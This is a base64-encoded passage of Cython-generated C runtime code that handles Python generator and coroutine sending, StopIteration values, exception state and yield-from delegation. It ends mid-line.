ICAgICAgICAgIFB5X3NzaXplX3QgdHVwbGVfc2l6ZSA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoZXYpOwogICAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICAgIGlmICh1bmxpa2VseSh0dXBsZV9zaXplIDwgMCkpIHsKICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodGIpOwogICAgICAgICAgICAgICAgUHlfREVDUkVGKGV2KTsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihldCk7CiAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIGlmICh0dXBsZV9zaXplID49IDEpIHsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICB2YWx1ZSA9IFB5VHVwbGVfR0VUX0lURU0oZXYsIDApOwogICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKI2VsaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgICAgICAgICAgdmFsdWUgPSBQeVNlcXVlbmNlX0lURU0oZXYsIDApOwojZWxzZQogICAgICAgICAgICAgICAgdmFsdWUgPSBQeVNlcXVlbmNlX0dldEl0ZW0oZXYsIDApOwogICAgICAgICAgICAgICAgaWYgKCF2YWx1ZSkgZ290byBsaW1pdGVkX2FwaV9mYWlsdXJlOwojZW5kaWYKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgICAgICAgICAgICAgIHZhbHVlID0gUHlfTm9uZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBQeV9ERUNSRUYoZXYpOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmICghX19QeXhfVHlwZUNoZWNrKGV2LCAoUHlUeXBlT2JqZWN0KilQeUV4Y19TdG9wSXRlcmF0aW9uKSkgewogICAgICAgICAgICB2YWx1ZSA9IGV2OwogICAgICAgIH0KICAgICAgICBpZiAobGlrZWx5KHZhbHVlKSkgewogICAgICAgICAgICBQeV9YREVDUkVGKHRiKTsKICAgICAgICAgICAgUHlfREVDUkVGKGV0KTsKICAgICAgICAgICAgKnB2YWx1ZSA9IHZhbHVlOwogICAgICAgICAgICByZXR1cm4gMDsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXQsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSB7CiAgICAgICAgX19QeXhfRXJyUmVzdG9yZShldCwgZXYsIHRiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeUVycl9Ob3JtYWxpemVFeGNlcHRpb24oJmV0LCAmZXYsICZ0Yik7CiAgICBpZiAodW5saWtlbHkoIVB5T2JqZWN0X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7CiAgICAgICAgX19QeXhfRXJyUmVzdG9yZShldCwgZXYsIHRiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9YREVDUkVGKHRiKTsKICAgIFB5X0RFQ1JFRihldCk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHIoZXYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSk7CiNlbHNlCiAgICB2YWx1ZSA9ICgoUHlTdG9wSXRlcmF0aW9uT2JqZWN0ICopZXYpLT52YWx1ZTsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiNlbmRpZgogICAgUHlfREVDUkVGKGV2KTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSByZXR1cm4gLTE7CiNlbmRpZgogICAgKnB2YWx1ZSA9IHZhbHVlOwogICAgcmV0dXJuIDA7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgfHwgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICBsaW1pdGVkX2FwaV9mYWlsdXJlOgogICAgUHlfWERFQ1JFRihldCk7CiAgICBQeV9YREVDUkVGKHRiKTsKICAgIFB5X1hERUNSRUYoZXYpOwogICAgcmV0dXJuIC0xOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORQpfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX3N0YXR1c19mcm9tX3Jlc3VsdChQeU9iamVjdCAqKnJldHZhbCkgewogICAgaWYgKCpyZXR2YWwpIHsKICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDsKICAgIH0gZWxzZSBpZiAobGlrZWx5KF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHJldHZhbCkgPT0gMCkpIHsKICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUKdm9pZCBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBQeV9DTEVBUihleGNfc3RhdGUtPmV4Y192YWx1ZSk7CiNlbHNlCiAgICBQeU9iamVjdCAqdCwgKnYsICp0YjsKICAgIHQgPSBleGNfc3RhdGUtPmV4Y190eXBlOwogICAgdiA9IGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlOwogICAgdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICBleGNfc3RhdGUtPmV4Y190eXBlID0gTlVMTDsKICAgIGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlID0gTlVMTDsKICAgIGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjayA9IE5VTEw7CiAgICBQeV9YREVDUkVGKHQpOwogICAgUHlfWERFQ1JFRih2KTsKICAgIFB5X1hERUNSRUYodGIpOwojZW5kaWYKfQojZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbikgIChfX1B5eF9fQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKSwgKFB5T2JqZWN0KilOVUxMKQpzdGF0aWMgdm9pZCBfX1B5eF9fQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHsKICAgIGNvbnN0IGNoYXIgKm1zZzsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGdlbik7CiAgICBpZiAoKDApKSB7CiAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKChQeU9iamVjdCopZ2VuKSkgewogICAgICAgIG1zZyA9ICJjb3JvdXRpbmUgYWxyZWFkeSBleGVjdXRpbmciOwogICAgI2VuZGlmCiAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgfSBlbHNlIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KChQeU9iamVjdCopZ2VuKSkgewogICAgICAgIG1zZyA9ICJhc3luYyBnZW5lcmF0b3IgYWxyZWFkeSBleGVjdXRpbmciOwogICAgI2VuZGlmCiAgICB9IGVsc2UgewogICAgICAgIG1zZyA9ICJnZW5lcmF0b3IgYWxyZWFkeSBleGVjdXRpbmciOwogICAgfQogICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1ZhbHVlRXJyb3IsIG1zZyk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX0FscmVhZHlUZXJtaW5hdGVkRXJyb3IoUHlPYmplY3QgKmdlbiwgUHlPYmplY3QgKnZhbHVlLCBpbnQgY2xvc2luZykgewogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGNsb3NpbmcpOwogICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICBpZiAoIWNsb3NpbmcgJiYgX19QeXhfQ29yb3V0aW5lX0NoZWNrKGdlbikpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCAiY2Fubm90IHJldXNlIGFscmVhZHkgYXdhaXRlZCBjb3JvdXRpbmUiKTsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICBpZiAodmFsdWUpIHsKICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KGdlbikpCiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uKTsKICAgICAgICBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19TdG9wSXRlcmF0aW9uKTsKICAgIH0KfQpzdGF0aWMKX19QeXhfUHlTZW5kUmVzdWx0IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmVzdWx0LCBpbnQgY2xvc2luZykgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBQeVRocmVhZFN0YXRlICp0c3RhdGU7CiAgICBfX1B5eF9FeGNJbmZvU3RydWN0ICpleGNfc3RhdGU7CiAgICBQeU9iamVjdCAqcmV0dmFsOwogICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhzZWxmKSk7ICAvLyBDYWxsZXJzIHNob3VsZCBlbnN1cmUgaXNfcnVubmluZwogICAgaWYgKHVubGlrZWx5KHNlbGYtPnJlc3VtZV9sYWJlbCA9PSAtMSkpIHsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVRlcm1pbmF0ZWRFcnJvcigoUHlPYmplY3QqKXNlbGYsIHZhbHVlLCBjbG9zaW5nKTsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9CiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICB0c3RhdGUgPSBfX3B5eF90c3RhdGU7CiNlbHNlCiAgICB0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7CiNlbmRpZgogICAgZXhjX3N0YXRlID0gJnNlbGYtPmdpX2V4Y19zdGF0ZTsKICAgIGlmIChleGNfc3RhdGUtPmV4Y192YWx1ZSkgewogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgICNlbHNlCiAgICAgICAgUHlPYmplY3QgKmV4Y190YjsKICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgZXhjX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTsKICAgICAgICAjZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICAgICAgZXhjX3RiID0gKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSBleGNfc3RhdGUtPmV4Y192YWx1ZSktPnRyYWNlYmFjazsKICAgICAgICAjZWxzZQogICAgICAgIGV4Y190YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjazsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAoZXhjX3RiKSB7CiAgICAgICAgICAgIFB5VHJhY2ViYWNrT2JqZWN0ICp0YiA9IChQeVRyYWNlYmFja09iamVjdCAqKSBleGNfdGI7CiAgICAgICAgICAgIFB5RnJhbWVPYmplY3QgKmYgPSB0Yi0+dGJfZnJhbWU7CiAgICAgICAgICAgIGFzc2VydChmLT5mX2JhY2sgPT0gTlVMTCk7CiAgICAgICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMEExCiAgICAgICAgICAgIGYtPmZfYmFjayA9IFB5VGhyZWFkU3RhdGVfR2V0RnJhbWUodHN0YXRlKTsKICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgUHlfWElOQ1JFRih0c3RhdGUtPmZyYW1lKTsKICAgICAgICAgICAgZi0+Zl9iYWNrID0gdHN0YXRlLT5mcmFtZTsKICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICAgICAgUHlfREVDUkVGKGV4Y190Yik7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgIH0KI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbSA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICB0c3RhdGUtPmV4Y19pbmZvID0gZXhjX3N0YXRlOwojZWxzZQogICAgaWYgKGV4Y19zdGF0ZS0+ZXhjX3R5cGUpIHsKICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spOwogICAgfSBlbHNlIHsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoZXhjX3N0YXRlKTsKICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spOwogICAgfQojZW5kaWYKICAgIHJldHZhbCA9IHNlbGYtPmJvZHkoc2VsZiwgdHN0YXRlLCB2YWx1ZSk7CiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBleGNfc3RhdGUgPSAmc2VsZi0+Z2lfZXhjX3N0YXRlOwogICAgdHN0YXRlLT5leGNfaW5mbyA9IGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbTsKICAgIGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbSA9IE5VTEw7CiAgICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRGcmFtZUJhY2twb2ludGVyKGV4Y19zdGF0ZSk7CiNlbmRpZgogICAgKnJlc3VsdCA9IHJldHZhbDsKICAgIGlmIChzZWxmLT5yZXN1bWVfbGFiZWwgPT0gLTEpIHsKICAgICAgICByZXR1cm4gbGlrZWx5KHJldHZhbCkgPyBQWUdFTl9SRVRVUk4gOiBQWUdFTl9FUlJPUjsKICAgIH0KICAgIHJldHVybiBQWUdFTl9ORVhUOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ29yb3V0aW5lX1Jlc2V0RnJhbWVCYWNrcG9pbnRlcihfX1B5eF9FeGNJbmZvU3RydWN0ICpleGNfc3RhdGUpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBDWVRIT05fVU5VU0VEX1ZBUihleGNfc3RhdGUpOwojZWxzZQogICAgUHlPYmplY3QgKmV4Y190YjsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBpZiAoIWV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKSByZXR1cm47CiAgICBleGNfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2soZXhjX3N0YXRlLT5leGNfdmFsdWUpOwogICAgI2Vsc2UKICAgIGV4Y190YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjazsKICAgICNlbmRpZgogICAgaWYgKGxpa2VseShleGNfdGIpKSB7CiAgICAgICAgUHlUcmFjZWJhY2tPYmplY3QgKnRiID0gKFB5VHJhY2ViYWNrT2JqZWN0ICopIGV4Y190YjsKICAgICAgICBQeUZyYW1lT2JqZWN0ICpmID0gdGItPnRiX2ZyYW1lOwogICAgICAgIFB5X0NMRUFSKGYtPmZfYmFjayk7CiAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQKICAgICAgICBQeV9ERUNSRUYoZXhjX3RiKTsKICAgICAgICAjZW5kaWYKICAgIH0KI2VuZGlmCn0KI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChnZW4sIHJlc3VsdCwgcmV0dmFsLCBpdGVybmV4dClcCiAgICAoKHJlc3VsdCkgPT0gUFlHRU5fTkVYVCA/IChyZXR2YWwpIDogX19QeXhfX0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KGdlbiwgcmVzdWx0LCByZXR2YWwsIGl0ZXJuZXh0KSkKc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfX0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KFB5T2JqZWN0KiBnZW4sIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQsIFB5T2JqZWN0ICpyZXR2YWwsIGludCBpdGVybmV4dCkgewogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTsKICAgIGlmIChsaWtlbHkocmVzdWx0ID09IFBZR0VOX1JFVFVSTikpIHsKICAgICAgICBpbnQgaXNfYXN5bmMgPSAwOwogICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICAgICAgaXNfYXN5bmMgPSBfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KGdlbik7CiAgICAgICAgI2VuZGlmCiAgICAgICAgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24ocmV0dmFsLCBpc19hc3luYywgaXRlcm5leHQpOwogICAgICAgIFB5X1hERUNSRUYocmV0dmFsKTsKICAgIH0KICAgIHJldHVybiBOVUxMOwp9CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUKUHlPYmplY3QgKl9fUHl4X1B5R2VuX1NlbmQoUHlHZW5PYmplY3QgKmdlbiwgUHlPYmplY3QgKmFyZykgewojaWYgUFlfVkVSU0lPTl9IRVggPD0gMHgwMzBBMDBBMQogICAgcmV0dXJuIF9QeUdlbl9TZW5kKGdlbiwgYXJnKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBpZiAoUHlJdGVyX1NlbmQoKFB5T2JqZWN0KilnZW4sIGFyZyA/IGFyZyA6IFB5X05vbmUsICZyZXN1bHQpID09IFBZR0VOX1JFVFVSTikgewogICAgICAgIGlmIChQeUFzeW5jR2VuX0NoZWNrRXhhY3QoZ2VuKSkgewogICAgICAgICAgICBhc3NlcnQocmVzdWx0ID09IFB5X05vbmUpOwogICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7CiAgICAgICAgfQogICAgICAgIGVsc2UgaWYgKHJlc3VsdCA9PSBQeV9Ob25lKSB7CiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7CiAgICAgICAgfQogICAgICAgIGVsc2UgewojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMEExCiAgICAgICAgICAgIF9QeUdlbl9TZXRTdG9wSXRlcmF0aW9uVmFsdWUocmVzdWx0KTsKI2Vsc2UKICAgICAgICAgICAgaWYgKCFQeVR1cGxlX0NoZWNrKHJlc3VsdCkgJiYgIVB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2socmVzdWx0KSkgewogICAgICAgICAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX1N0b3BJdGVyYXRpb24sIHJlc3VsdCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqZXhjID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpOwogICAgICAgICAgICAgICAgaWYgKGxpa2VseShleGMgIT0gTlVMTCkpIHsKICAgICAgICAgICAgICAgICAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfU3RvcEl0ZXJhdGlvbiwgZXhjKTsKICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZXhjKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQojZW5kaWYKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7CiAgICAgICAgcmVzdWx0ID0gTlVMTDsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7CiNlbmRpZgp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBfX1B5eF9QeVNlbmRSZXN1bHQKX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIFB5T2JqZWN0KiogcmV0dmFsKSB7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgUHlPYmplY3QgKnZhbCA9IE5VTEw7CiAgICBhc3NlcnQoX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKGdlbikpOwogICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsICZ2YWwpOwogICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIHZhbCwgcmV0dmFsLCAwKTsKICAgIFB5X1hERUNSRUYodmFsKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2lmIENZVEhPTl9VU0VfQU1fU0VORApzdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0Cl9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGdlbl9hbV9zZW5kLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKSB7CiAgICBQeU9iamVjdCAqcmV0ID0gTlVMTDsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCBkZWxlZ2F0ZV9yZXN1bHQsIHJlc3VsdDsKICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoZ2VuKSk7CiAgICBkZWxlZ2F0ZV9yZXN1bHQgPSBnZW5fYW1fc2VuZChnZW4tPnlpZWxkZnJvbSwgdmFsdWUsICZyZXQpOwogICAgaWYgKGRlbGVnYXRlX3Jlc3VsdCA9PSBQWUdFTl9ORVhUKSB7CiAgICAgICAgYXNzZXJ0IChyZXQgIT0gTlVMTCk7CiAgICAgICAgKnJldHZhbCA9IHJldDsKICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDsKICAgIH0KICAgIGFzc2VydCAoZGVsZWdhdGVfcmVzdWx0ICE9IFBZR0VOX0VSUk9SIHx8IHJldCA9PSBOVUxMKTsKICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgcmV0LCByZXR2YWwsIDApOwogICAgUHlfWERFQ1JFRihyZXQpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlKSB7CiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQW1TZW5kKHNlbGYsIHZhbHVlLCAmcmV0dmFsKTsKICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMCk7Cn0Kc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdApfX1B5eF9Db3JvdXRpbmVfQW1TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKSB7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0Kikgc2VsZjsKICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHsKICAgICAgICAqcmV0dmFsID0gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9CiAgICAjaWYgQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICBpZiAoZ2VuLT55aWVsZGZyb21fYW1fc2VuZCkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShnZW4sIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQsIHZhbHVlLCByZXR2YWwpOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgIGlmIChnZW4tPnlpZWxkZnJvbSkgewogICAgICAgIFB5T2JqZWN0ICp5ZiA9IGdlbi0+eWllbGRmcm9tOwogICAgICAgIFB5T2JqZWN0ICpyZXQ7CiAgICAgICNpZiAhQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICAgICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgICAgICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgdmFsdWUpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kKHlmLCB2YWx1ZSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgICAgICBpZiAoX19weXhfUHlBc3luY0dlbkFTZW5kX0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X2FzeW5jX2dlbl9hc2VuZF9zZW5kKHlmLCB2YWx1ZSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGlmIChQeUdlbl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIHZhbHVlID09IFB5X05vbmUgPyBOVUxMIDogdmFsdWUpOwogICAgICAgIH0gZWxzZQogICAgICAgIGlmIChQeUNvcm9fQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCB2YWx1ZSA9PSBQeV9Ob25lID8gTlVMTCA6IHZhbHVlKTsKICAgICAgICB9IGVsc2UKICAgICAgICAjZW5kaWYKICAgICAgI2VuZGlmCiAgICAgICAgewogICAgICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwCiAgICAgICAgICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lICYmIFB5SXRlcl9DaGVjayh5Z